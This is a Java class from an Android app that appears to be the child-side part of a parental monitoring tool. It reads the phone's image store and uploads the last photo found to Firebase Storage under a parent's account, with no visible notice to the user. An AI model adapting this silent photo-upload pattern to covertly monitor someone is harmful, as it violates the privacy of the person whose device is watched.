package photo;

import android.content.ContentUris;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.provider.MediaStore;
import android.util.Log;

import androidx.annotation.NonNull;

import com.example.childmonitoringchildversion.UpdateChildData;
import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;

import contact.ContactModel;


public class PhotosTrack {

    public PhotosTrack(Context context) {
        getPhoto(context);
    }

    private void getPhoto(Context context){

        Uri collection ;
        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q){
            collection = MediaStore.Images.Media.getContentUri(MediaStore.VOLUME_EXTERNAL);
        }else{
            collection = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
        }

        String[] projection = new String[] {
                MediaStore.Images.Media._ID,
                MediaStore.Images.Media.DISPLAY_NAME,


        };


        Uri uri = null;
        String order = MediaStore.Images.Media.DEFAULT_SORT_ORDER;

        try (Cursor cursor = context.getContentResolver().query(collection , projection,
                null , null , null)){

            int idCl = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID);
            int nameCl = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME);

            while(cursor.moveToNext()) {

                long id = cursor.getLong(idCl);
                String name = cursor.getString(nameCl);
                // Toast.makeText(getApplicationContext(), uri.getPath(), Toast.LENGTH_SHORT).show();

                if(cursor.isLast()) {
                    uri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id);
                    sendDataToServer(uri, name);
                }



            }
        }catch (Exception e){
            e.printStackTrace();
        }
        if(uri != null){
            //imageView.setImageURI(uri);
        }

    }

    private void sendDataToServer(Uri uri , String name) {



        try {
            StorageReference reference = FirebaseStorage.getInstance()
                    .getReference(UpdateChildData.userID)
                    .child("Child")
                    .child(UpdateChildData.child);

            reference.putFile(uri).addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
                @Override
                public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
                    Log.i(PhotosTrack.class.getSimpleName(), "Photo uploaded success");

                }
            }).addOnFailureListener(new OnFailureListener() {
                @Override
                public void onFailure(@NonNull Exception e) {
                    e.printStackTrace();
                }
            });

        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
